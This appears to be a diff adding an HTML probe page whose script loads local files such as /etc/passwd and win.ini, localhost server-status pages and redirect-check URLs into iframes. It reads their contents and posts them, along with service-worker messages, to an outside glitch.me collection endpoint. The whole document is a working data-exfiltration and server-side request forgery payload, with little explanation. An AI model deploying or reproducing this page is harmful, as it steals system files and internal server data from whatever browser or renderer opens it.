@@ -1,0 +1,417 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <head>
+        <meta charset="UTF-8">
+        <title></title>
+        <style>
+            table, th, td {
+                border: 1px solid black;
+                border-collapse: collapse;
+            }
+            th, td {
+                padding: 2px;
+            }
+            iframe {
+                width: 250x;
+                height: 150px;
+            }
+        </style>
+    </head>
+  
+    <script>
+
+      //document.domain="http://127.0.0.1";
+
+
+      
+      document.addEventListener('DOMContentLoaded', function() {
+            var platform = navigator.platform;
+            var userAgent = navigator.userAgent;
+            var uaOs;
+            var webServer = "unknown";
+        
+            // OS from User-agent
+            if (userAgent.includes('Windows')) {
+                uaOs = 'Windows';
+            } else if (userAgent.includes('Linux')) {
+                uaOs = 'Linux';
+            }
+
+             // OS 
+            if (platform.includes('Win')) {
+                platform = 'Windows';
+            } else if (platform.includes('Linux')) {
+                platform = 'Linux';
+            } else {
+                platform = uaOs;
+            }
+        
+            // logging OS, browser version
+            console.log("Platform: " + platform);
+            console.log("User-Agent: " + userAgent);
+            console.log("Determined OS: " + uaOs);
+
+            // set iframe src
+
+            document.getElementById('iframe1_1').src  = 'file:///etc/passwd';
+            document.getElementById('iframe1_2').src  = 'file:///C://Windows//win.ini';
+        
+            document.getElementById('iframe11_1').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_file_l.html';
+            document.getElementById('iframe11_2').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_file_w.html';
+
+            document.getElementById('iframe12').src   = 'https://artistic-spiny-network.glitch.me/checkrdrt_127.html';
+            document.getElementById('iframe13_1').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_server_a.html';
+            document.getElementById('iframe13_2').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_server_n.html';
+        
+        
+            document.getElementById('iframe21').src   = 'https://artistic-spiny-network.glitch.me/apache_127';
+            document.getElementById('iframe22').src   = 'https://artistic-spiny-network.glitch.me/nginx_127';
+            document.getElementById('iframe23').src   = 'https://artistic-spiny-network.glitch.me/basic_admin';
+            document.getElementById('iframe24').src   = 'https://artistic-spiny-network.glitch.me/basic_phpmyadmin';
+        
+            document.getElementById('iframe25').src   = 'https://artistic-spiny-network.glitch.me/basic';
+            document.getElementById('iframe26').src   = 'https://artistic-spiny-network.glitch.me/apache_localtest';
+            document.getElementById('iframe27').src   = 'https://artistic-spiny-network.glitch.me/nginx_localtest';
+        
+        
+    
+        
+        
+            // iframe1_1 onload    
+            var iframe1_1 = document.getElementById('iframe1_1');
+            iframe1_1.onload = function() {
+                var iframeContent = iframe1_1.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe1_1').src , iframeContent);
+            };
+        
+            // iframe1_2 onload    
+            var iframe1_2 = document.getElementById('iframe1_2');
+            iframe1_2.onload = function() {
+                var iframeContent = iframe1_2.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe1_2').src , iframeContent);
+            };
+
+        
+            // iframe11_1 onload    
+            var iframe11_1 = document.getElementById('iframe11_1');
+            iframe11_1.onload = function() {
+                var iframeContent = iframe11_1.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe11_1').src , iframeContent);
+            };
+
+                
+            // iframe11_2 onload    
+            var iframe11_2 = document.getElementById('iframe11_2');
+            iframe11_2.onload = function() {
+                var iframeContent = iframe11_2.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe11_2').src , iframeContent);
+            };
+        
+            // iframe12 onload    
+            var iframe12 = document.getElementById('iframe12');
+            iframe12.onload = function() {
+                var iframeContent = iframe12.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe12').src , iframeContent);
+            };        
+        
+            // iframe13_1 onload    
+            var iframe13_1 = document.getElementById('iframe13_1');
+            iframe13_1.onload = function() {
+                var iframeContent = iframe13_1.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe13_1').src , iframeContent);
+            };        
+        
+            // iframe13_2 onload    
+            var iframe13_2 = document.getElementById('iframe13_2');
+            iframe13_2.onload = function() {
+                var iframeContent = iframe13_2.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe13_2').src , iframeContent);
+            };            
+        
+              
+              
+//               var observer = new MutationObserver(function(mutations) {
+//                   mutations.forEach(function(mutation) {
+//                       var currentUrl = iframe13_2.contentWindow.location.href;
+//                       console.log(currentUrl);
+//                       if (currentUrl != 'https://artistic-spiny-network.glitch.me/checkrdrt_server_n.html') {
+//                           observer.disconnect(); // Observer 중지
+
+//                           // 데이터 전송
+//                           var iframeContent = iframe13_2.contentWindow.document.body.innerHTML;
+//                           sendDataToServer(iframe13_2.src, iframeContent);
+//                       }
+//                   });
+//               });
+
+//               // Observer 구성 및 시작
+//               observer.observe(iframe13_2.contentDocument.body, { childList: true, subtree: true });
+            // };        
+        
+            // iframe21 onload    
+            var iframe21 = document.getElementById('iframe21');
+            iframe21.onload = function() {
+                var iframeContent = iframe21.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe21').src , iframeContent);
+            };             
+        
+        
+        
+            // load iframe
+            function loadIframe(iframeId, url) {
+                return new Promise((resolve, reject) => {
+                    var iframe = document.getElementById(iframeId);
+                    iframe.onload = function() {
+                      
+                      
+                        try {
+                            // access iframe
+                            var content = iframe.contentWindow.document || iframe.contentDocument;
+                            if (content.location.href === 'about:blank') {
+                                //transfer data
+                                sendDataToServer(iframe.src, 'Iframe failed to load');
+                                throw new Error('Iframe failed to load: ' + url);
+                            }
+                            
+                          //console.dir(iframe.contentWindow.document );
+                          //console.dir(iframe.contentdocument );
+                          
+                            //transfer data
+                            sendDataToServer(iframe.src, content.body.innerHTML);
+                          
+                            // success
+                            resolve(content.body.innerHTML.toLowerCase());
+                        } catch (error) {
+                          
+                          //console.dir(iframe);
+                          
+                          
+                          
+                            //transfer data
+                            sendDataToServer(iframe.src, error.toString());
+                          
+                            resolve(error.toString());
+                        }
+
+                    };
+                    iframe.onerror = reject;
+                    iframe.src = url;
+                });
+            }
+
+            // iframe2_1, iframe3_1, ifrmae3_2 order 
+            loadIframe('iframe2_1', 'http://127.0.0.1')  //loadIframe('iframe2_1', 'https://bing.com')
+            .then(iframe2_1Content => {
+
+                return loadIframe('iframe3_1', 'http://127.0.0.1/server-status');
+            })
+            .then(iframe3_1Content => {
+
+                return loadIframe('iframe3_2', 'http://127.0.0.1/nginx_status');
+            })
+            .then(iframe3_2Content => {
+
+                //return loadIframe('iframe4', 'chrome://version');
+            })
+            .catch(error => {
+                console.error('Error loading iframe:', error);
+            });
+
+            var sp1Element = document.getElementById('sp1');
+            var sp2Element = document.getElementById('sp2');
+            var sp3Element = document.getElementById('sp3');
+            var sp4Element = document.getElementById('sp4');
+            sp1Element.textContent = "-Platform:" + navigator.platform;
+            sp2Element.textContent = "-U-agent :" + navigator.userAgent;
+            sp3Element.textContent = "-Det-plat:" + platform;
+        
+            sp4Element.textContent = "-location:" + window.location; //document.domain;
+            
+            if (!window.location.href.includes('glitch')) {
+                sp4Element.textContent = "-Location:" + window.location.href; //document.domain;
+            }
+            else
+                sp4Element.textContent = "-Location:Remote";
+        
+        });
+      
+      
+    // Transfer data to server
+    function sendDataToServer(url, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://artistic-spiny-network.glitch.me/receive', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                // process data
+                if (xhr.status === 200) {
+                    console.log('send data');
+                } else {
+                    console.log('Errors in transit');
+                }
+            }
+        };
+
+        // trans data (json)
+        xhr.send(JSON.stringify({ url: url, data: data }));
+    }
+
+        
+    </script>
+</head>
+<body>
+    <span id="sp1"></span><br>
+    <span id="sp2"></span><br>
+    <span id="sp3"></span>&nbsp;&nbsp;
+    <span id="sp4"></span>&nbsp;&nbsp;
+    <span id="sp5"></span>
+
+    <table>
+        <tr>
+            <td bgcolor="pink">FlW</td>  
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe1_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe1_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>
+          
+            <td bgcolor="pink">127</td>
+            <td><iframe id="iframe2_1"></iframe></td>
+
+            <td bgcolor="pink">SMan</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe3_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe3_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>
+          
+        </tr>
+        <tr>          
+          
+            <td bgcolor="lime">CFl</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe11_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe11_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>              
+
+            <td bgcolor="lime">C127</td>
+            <td><iframe id="iframe12"></iframe></td>
+      
+            <td bgcolor="lime">Can</td>  
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe13_1" width="140" ></iframe></td>
+                  <td><iframe id="iframe13_2" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+        </tr>
+        <tr>              
+
+            <td bgcolor="khaki">Sb</td>  
+            <td><iframe id="iframe25"></iframe></td>
+          
+            <td bgcolor="khaki">S1AP</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe23" width="140" ></iframe></td>
+                  <td><iframe id="iframe24" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+            <td bgcolor="khaki">S1an</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe21" width="140" ></iframe></td>
+                  <td><iframe id="iframe22" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+          
+        </tr>
+        <tr>              
+            <td bgcolor="khaki">Slan</td>
+            <td>
+              <table>
+                <tr>
+                  <td><iframe id="iframe26" width="140" ></iframe></td>
+                  <td><iframe id="iframe27" width="140" ></iframe></td>
+                </tr>
+              </table>
+            </td>            
+
+        </tr>
+
+
+    </table>
+  
+</body>
+  
+  
+  <script>
+
+
+      var sp5Element = document.getElementById('sp5');
+      
+      if ('serviceWorker' in navigator) {
+          navigator.serviceWorker.register('service-worker.js')
+              .then(registration => {
+                  //console.log('Service Worker registered with scope:', registration.scope);
+                  //sp5Element.textContent = "Sworker start";
+              })
+              .catch(error => {
+                  //console.log('Service Worker registration failed:', error);
+              });
+        
+          // wait massge from Service Worker
+          navigator.serviceWorker.addEventListener('message', event => {
+              const data = event.data;
+              //console.log('receive message from Service Worker:', data.text);
+              sp5Element.textContent = "SendBySworker";
+            
+              //transfer data
+              sendDataToServer('[-SW-]' + data.url, data.text);
+             
+        });
+        
+
+      }
+    
+  </script>
+    
+</html>
